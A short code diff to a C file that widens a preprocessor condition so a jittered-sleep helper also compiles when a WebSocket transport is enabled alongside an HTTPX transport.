@@ -3,7 +3,7 @@
 #include "Utils.h"
 #include "Config.h"
 
-#ifdef HTTPX_TRANSPORT
+#if defined(HTTPX_TRANSPORT) || defined(WEBSOCKET_TRANSPORT)
 
 // Function to apply jitter to the sleep time
 VOID SleepWithJitter(INT baseSleepTime, INT maxJitter) 
